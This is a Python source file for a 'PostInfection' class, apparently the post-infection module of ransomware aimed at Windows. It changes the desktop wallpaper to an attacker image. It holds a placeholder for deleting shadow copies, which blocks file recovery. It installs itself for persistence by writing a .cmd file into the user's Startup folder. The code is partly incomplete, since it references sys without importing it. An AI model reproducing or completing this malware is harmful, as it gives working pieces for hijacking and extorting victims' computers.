import os
import ctypes
from shutil import copyfile

class PostInfection(object):

    def __init__(self):
        print("PostInfection Object Created")
        self.logo = self.resource_path(["images"],"logo.png")
        self.wallpaper = self.resource_path(["images"],"wallpaper.png")   
        print("Logo :", self.logo)
        print("Wallpaper :", self.wallpaper)

    def resource_path(self, folders, filename):
        """ Get absolute path to resource, works for dev and for PyInstaller """
        try:
            # PyInstaller creates a temp folder and stores path in _MEIPASS
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")

        for fol in folders:
            base_path = os.path.join(base_path,fol)

        return os.path.join(base_path, filename) 
    
    def changeWallpaper(self):

        _status = ctypes.windll.user32.SystemParametersInfoW(0x14, 0, self.wallpaper, 0x2)
        if _status:
            print("Wallpaper has been changed")
        else:
            print("The problem has occured on changing wallpaper")

    def deleteShadowFiles(self):
        print("deleteShadowFiles")
    
    def setItselfStartUpApplication(self, keyspath):
        """
            create autorun program to display a warning message each time a computer is turned on
        """
        
        # TODO: try-except for KeyError
        # get startup location
        _startup_location = os.environ["USERPROFILE"]+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        #_startup_location_2 = os.environ["APPDATA"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"

        # prevent from overwriting
        _file_count = str(len(os.listdir(_startup_location)))
        _autorun_file_path = os.path.join(_startup_location,_file_count+"authrun.cmd")
        
        # creaing autorun script
        with open(_autorun_file_path,"w") as autorunfile:
            autorunfile.write(keyspath)

